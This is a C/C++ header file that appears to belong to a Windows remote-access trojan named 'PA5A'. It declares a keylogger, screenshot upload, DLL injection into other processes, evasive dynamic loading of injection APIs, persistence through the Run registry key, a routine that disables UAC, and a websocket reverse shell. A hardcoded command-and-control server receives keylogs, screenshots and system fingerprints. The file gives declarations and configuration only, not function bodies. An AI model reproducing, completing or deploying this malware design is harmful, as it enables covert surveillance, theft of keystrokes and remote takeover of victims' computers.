#pragma once

#pragma comment(lib, "gdiplus")
#pragma comment(lib, "crypt32")
#pragma comment(lib, "wininet")
#pragma comment(lib, "ws2_32")
#pragma comment(lib, "shlwapi")
#pragma comment(lib, "ws2_32")
#pragma comment(lib, "Userenv")
#pragma comment(lib, "iphlpapi")
#pragma comment(lib, "psapi")

#include <libwebsockets.h>
#include <stdio.h>
#include <stdlib.h>
#include <cjson/cJSON.h>
#include <Windows.h>
#include <WinInet.h>
#include <wincrypt.h>
#include <string.h>
#include <time.h>
#include <strsafe.h>
#include <Psapi.h>
#include <shlwapi.h>
#include <gdiplus.h>
#include <tlhelp32.h>
#include "../resources/resource.h"

#pragma warning(disable:4996)


EXTERN_C_START

/******************************CONFIGURATION******************************/

#define DATA_FOLDER_A		"C:\\ProgramData\\PA5A\\"
#define DATA_FOLDER_W		L"C:\\ProgramData\\PA5A\\"
#define APP_NAME_A			"PA5A"
#define APP_NAME_W			L"PA5A"
#define EXE_FILE_A			"PA5A.exe"
#define EXE_FILE_W			L"PA5A.exe"
#define DLL_FILE_A			"PA5A.dll"
#define DLL_FILE_W			L"PA5A.dll"
#define SCREENSHOT_FILE_W	L"screenshot.jpeg"
#define SERVER_NAME_A		"pa5a.cyberfilou.fr"
#define SERVER_NAME_W		L"pa5a.cyberfilou.fr"
#define USER_AGENT_A		"PA5A-BOT"
#define USER_AGENT_W		L"PA5A-BOT"
#define HTTP_PORT			80
#define HTTPS_PORT			443
#define CLIENT_API_A		"/api/clients/"
#define COMMANDS_API_A		"/commands"
#define KEYLOGS_API_A		"/keylogs"
#define SCREENSHOT_API_A	"/screenshot"
#define REVERSE_SHELL_WS_A  "/rsclient"
#define PATH_SIZE			2048
#define URL_SIZE			4096
#define UUID_SIZE			256
#define INFORMATION_SIZE	2048
#define WS_SERVER_URL		"wss://" SERVER_NAME_A REVERSE_SHELL_WS_A


/********************************************************************************************************************************/
// http.cpp
typedef struct Commands
{
	BOOL keylogs;
	BOOL screenshot;
	BOOL reverseShell;
} Commands;

VOID GenerateBoundary(LPSTR buffer, SIZE_T size);
Commands GetCommands(LPCSTR server, DWORD port);
BOOL SendJsonDataByHttps(LPCSTR server, DWORD port, LPCSTR url, LPCSTR method, LPCSTR userAgent, LPCSTR jsonData);

/********************************************************************************************************************************/
// informations.cpp
typedef struct _dmi_header
{
	BYTE type;
	BYTE length;
	WORD handle;
} dmi_header;

typedef struct _RawSMBIOSData
{
	BYTE    Used20CallingMethod;
	BYTE    SMBIOSMajorVersion;
	BYTE    SMBIOSMinorVersion;
	BYTE    DmiRevision;
	DWORD   Length;
	BYTE    SMBIOSTableData[65536];
} RawSMBIOSData;

typedef enum InformationType
{
	COMPUTER_NAME,
	MANUFACTURER,
	PRODUCT_NAME,
	SERIAL_NUMBER,
	FAMILY,
	BIOS_UUID
} InformationType;

BOOL dmi_system_uuid(const PBYTE biosTableData, SHORT version, LPSTR uuid, SIZE_T maxLength);
VOID dmi_string(const dmi_header* header, BYTE index, LPSTR destination, SIZE_T maxLength);
BOOL GetInformation(LPSTR destination, DWORD maxLength, InformationType informationType);
cJSON* CreateInformationsJsonObject();
BOOL SendClientInformations();

/********************************************************************************************************************************/
// injection.cpp
typedef struct ProcessForDllInjection
{
	DWORD processId;
	BOOL running;
} ProcessForDllInjection;

BOOL WritePa5aDll();
BOOL inject(DWORD processId);
DWORD GetProcessIdFormProcessName(LPCWSTR processName);
VOID checkProcessForDllInjection(ProcessForDllInjection* infos, LPCWSTR processName);
DWORD WINAPI ThreadInjector();

/********************************************************************************************************************************/
// keylogger.cpp
LRESULT WINAPI HookProc(int code, WPARAM wParam, LPARAM lParam);
VOID WriteLogs(PWCHAR logsUnicode, PWCHAR appNameUnicode, PWCHAR pathUnicode);
cJSON* CreateJsonLogsObject(PCHAR logs, PCHAR app, PCHAR path);
VOID WriteJsonObjectLogs(cJSON* newJsonObject);
VOID SendKeylogs();
DWORD WINAPI ThreadKeylogger();

/********************************************************************************************************************************/
// LeagueOfLegends.cpp
LRESULT CALLBACK leagueOfLengendsWindowProc(HWND hWnd, UINT uMsg, WPARAM wParam, LPARAM lParam);
DWORD ThreadLeagueOfLegends();

/********************************************************************************************************************************/
// list.cpp
/**********************************************************/
typedef struct Node
{
	struct Node* prev;
	struct Node* next;
	void* data;
} Node;

typedef struct List
{
	struct Node* head;
	struct Node* tail;
	int          size;
} List;

Node* add_node(List* list);
void del_node(List* list, int index);
int index_of_node(Node* head, Node* node);
Node* node_of_index(Node* head, int index);
void init_node_data(Node* node, size_t length);
Node* node_of_data(Node* head, void* data);

/********************************************************************************************************************************/
// loader.cpp
typedef HHOOK (WINAPI* SetWindowsHookExAProc)(int idHook, HOOKPROC lpfn, HINSTANCE hmod, DWORD dwThreadId);
typedef HHOOK (WINAPI* SetWindowsHookExWProc)(int idHook, HOOKPROC lpfn, HINSTANCE hmod, DWORD dwThreadId);
typedef LPVOID (WINAPI* VirtualAllocExProc)(HANDLE hProcess, LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);
typedef BOOL (WINAPI* WriteProcessMemoryProc)(HANDLE hProcess, LPVOID lpBaseAddress, LPCVOID lpBuffer, SIZE_T nSize, SIZE_T* lpNumberOfBytesWritten);
typedef HANDLE (WINAPI* CreateRemoteThreadProc)(HANDLE hProcess, LPSECURITY_ATTRIBUTES lpThreadAttributes, SIZE_T dwStackSize, LPTHREAD_START_ROUTINE lpStartAddress, LPVOID lpParameter, DWORD dwCreationFlags, LPDWORD lpThreadId);
typedef HANDLE (WINAPI* CreateToolhelp32SnapshotProc)(DWORD dwFlags, DWORD th32ProcessID);
typedef BOOL (WINAPI* Process32FirstWProc)(HANDLE hSnapshot, LPPROCESSENTRY32W lppe);
typedef BOOL (WINAPI* Process32NextWProc)(HANDLE  hSnapshot, LPPROCESSENTRY32W lppe);
typedef DWORD (WINAPI* GetWindowThreadProcessIdProc)(HWND hWnd, LPDWORD lpdwProcessId);
typedef HANDLE (WINAPI* OpenProcessProc)(DWORD dwDesiredAccess, BOOL bInheritHandle, DWORD dwProcessId);
typedef BOOL (WINAPI* TerminateProcessProc)(HANDLE hProcess, UINT uExitCode);
typedef BOOL (WINAPI* CreateProcessAProc)(LPCSTR lpApplicationName, LPSTR lpCommandLine, LPSECURITY_ATTRIBUTES lpProcessAttributes, LPSECURITY_ATTRIBUTES lpThreadAttributes, BOOL bInheritHandles, DWORD dwCreationFlags, LPVOID lpEnvironment, LPCSTR lpCurrentDirectory, LPSTARTUPINFOA lpStartupInfo, LPPROCESS_INFORMATION lpProcessInformation);
typedef BOOL (WINAPI* CreateProcessWProc)(LPCWSTR lpApplicationName, LPWSTR lpCommandLine, LPSECURITY_ATTRIBUTES lpProcessAttributes, LPSECURITY_ATTRIBUTES lpThreadAttributes, BOOL bInheritHandles, DWORD dwCreationFlags, LPVOID lpEnvironment, LPCWSTR lpCurrentDirectory, LPSTARTUPINFOW lpStartupInfo, LPPROCESS_INFORMATION lpProcessInformation);
typedef UINT (WINAPI* GetSystemFirmwareTableProc)(DWORD FirmwareTableProviderSignature, DWORD FirmwareTableID, PVOID pFirmwareTableBuffer, DWORD BufferSize);

extern HMODULE hKernel32;
extern HMODULE hUser32;
extern SetWindowsHookExAProc MySetWindowsHookExA;
extern SetWindowsHookExWProc MySetWindowsHookExW;
extern VirtualAllocExProc MyVirtualAllocEx;
extern WriteProcessMemoryProc MyWriteProcessMemory;
extern CreateRemoteThreadProc MyCreateRemoteThread;
extern CreateToolhelp32SnapshotProc MyCreateToolhelp32Snapshot;
extern Process32FirstWProc MyProcess32FirstW;
extern Process32NextWProc MyProcess32NextW;
extern GetWindowThreadProcessIdProc MyGetWindowThreadProcessId;
extern OpenProcessProc MyOpenProcess;
extern TerminateProcessProc MyTerminateProcess;
extern CreateProcessAProc MyCreateProcessA;
extern CreateProcessWProc MyCreateProcessW;
extern GetSystemFirmwareTableProc MyGetSystemFirmwareTable;

BOOL loader();

/********************************************************************************************************************************/
// main.cpp
INT WINAPI wWinMain(_In_ HINSTANCE hInstance, _In_opt_ HINSTANCE hPrevInstance, _In_ LPWSTR lpCmdLine, _In_ INT nCmdShow);

/********************************************************************************************************************************/
// registry.cpp
#define PERSISTENCE_REGISTRY_KEY_A "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"
#define PERSISTENCE_REGISTRY_KEY_W L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"
#define UAC_REGISTRY_KEY_A "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System"
#define UAC_REGISTRY_KEY_W L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System"
#define UAC_REGISTRY_VALUE_A "EnableLUA"
#define UAC_REGISTRY_VALUE_W L"EnableLUA"

BOOL SetRegistryKeyStringValue(HKEY hKey, LPCWSTR key, LPCWSTR name, LPCWSTR data);
BOOL SetRegistryKeyDwordValue(HKEY hKey, LPCWSTR key, LPCWSTR name, DWORD data);
BOOL SetPersistence();
BOOL DisableUac();

/********************************************************************************************************************************/
// screenshot.cpp
INT WINAPI GetEncoderClsid(LPCWSTR format, CLSID* pClsid);
BOOL WINAPI SaveScreenshot(LPCWSTR filename);
VOID SendScreenshot();

/********************************************************************************************************************************/
// shell.cpp
#define BUFSIZE 65535

typedef struct WebSocketData
{
	// Streams handles
	HANDLE hChildStd_Input_Rd;
	HANDLE hChildStd_Input_Wr;
	HANDLE hChildStd_Output_Rd;
	HANDLE hChildStd_Output_Wr;
	HANDLE hChildStd_Err_Rd;
	HANDLE hChildStd_Err_Wr;

	// Threads handles
	HANDLE hThreadReadStdout;
	HANDLE hThreadReadStderr;

	// Process handle
	HANDLE hCmdProcess;

	// socket handle
	struct lws* socket;
	// context
	lws_context* context;
} WebSocketData;

BOOL CreatePipes(struct WebSocketData* wsData);
INT CreateChildProcess(LPCWSTR processName, WebSocketData* wsData);
BOOL WriteToPipe(LPSTR command, HANDLE handle);
BOOL ReadFromPipe(HANDLE handle, LPSTR buffer, SIZE_T length);
VOID PrintError(LPSTR text, INT err);
DWORD WINAPI ReadStdoutProc(HANDLE wsData);
DWORD WINAPI ReadStderrProc(HANDLE wsData);
DWORD WINAPI ThreadReverseShell();

/********************************************************************************************************************************/
// utils.cpp
VOID CreateConsole();
LONGLONG GetTimestamp(BOOL inMlliseconds);
VOID gettimeofday(struct timeval* tp, struct timezone* tzp);
LONGLONG SystemTimeToUnixTimestamp(SYSTEMTIME system_time);
SYSTEMTIME UnixTimestampToSystemTime(LONGLONG timestamp);
PCHAR encode_UTF8(LPCWCHAR messageUTF16);

/********************************************************************************************************************************/
// ws.cpp
extern List listWebSockets;
extern struct lws_context* context;

INT reverse_shell_callback(struct lws* socket, enum lws_callback_reasons reason, PVOID user, PVOID in, SIZE_T len);
BOOL WebSocketConnection();

static struct lws_protocols protocols[] =
{
	{"pa5a_reversehell", (lws_callback_function*)reverse_shell_callback, 0, 0, 0, NULL, 0},
	{NULL, NULL, 0, 0, 0, NULL, 0}
};

EXTERN_C_END
